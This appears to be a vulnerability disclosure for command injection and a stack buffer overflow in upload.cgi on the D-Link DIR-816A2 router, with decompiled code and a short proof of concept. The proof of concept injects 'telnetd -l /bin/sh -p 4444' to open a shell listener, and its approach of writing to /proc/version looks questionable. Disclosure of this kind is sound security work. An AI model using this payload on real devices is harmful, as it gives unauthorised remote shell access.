# Command Injection and Buffer Overflow Vulnerability in `/proc/version`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | D-Link DIR-816A2 Router                                      |
| Firmware Version     | **DIR-816A2_FWv1.10CNB05_R1B011D88210.img** (other versions require verification) |
| Vulnerability Type   | **Command Injection & Stack Buffer Overflow**                |
| Vulnerable Component | `upload.cgi` (firmware version information handling module)  |
| Prerequisites        | Requires control over the `/proc/version` content            |

2. Exploitation Path

```c
int sub_401078()
{
  int v0; // $s0
  _BYTE v2[512]; // [sp+18h] [-400h] BYREF
  char v3[512]; // [sp+218h] [-200h] BYREF

  v0 = fopen("/proc/version", "r");
  fgets(v3, 512, v0);
  fclose(v0);
  sprintf(v2, "nvram_set 2860 old_firmware \"%s\"", v3);
  return system(v2);
}
```

3. **Vulnerable Binary:** `upload.cgi`.

4. 0-Day Exploitation Path:

   - In `upload.cgi`, line 8: `fgets(v3, 512, v0)` reads input without filtering special characters, which is concatenated and passed to line 11: `system(v2)`, resulting in a command injection vulnerability.

   - In `upload.cgi`, line 8: `fgets(v3, 512, v0)` limits input to 512 bytes, but at line 10: `sprintf(v2, "nvram_set 2860 old_firmware \"%s\"", v3)`, the concatenation includes a 29-byte constant portion. If `/proc/version` exceeds 481 bytes, this triggers a stack buffer overflow.

5. Proof of Concept (PoC) for Reproducing the Vulnerabilities:

```bash
# Simulate malicious firmware version (Command Injection)
echo "1.0.0; telnetd -l /bin/sh -p 4444" > /proc/version

# Simulate overlong firmware version (Buffer Overflow)
dd if=/dev/urandom bs=500 count=1 | tr -dc 'a-zA-Z0-9' > /proc/version
```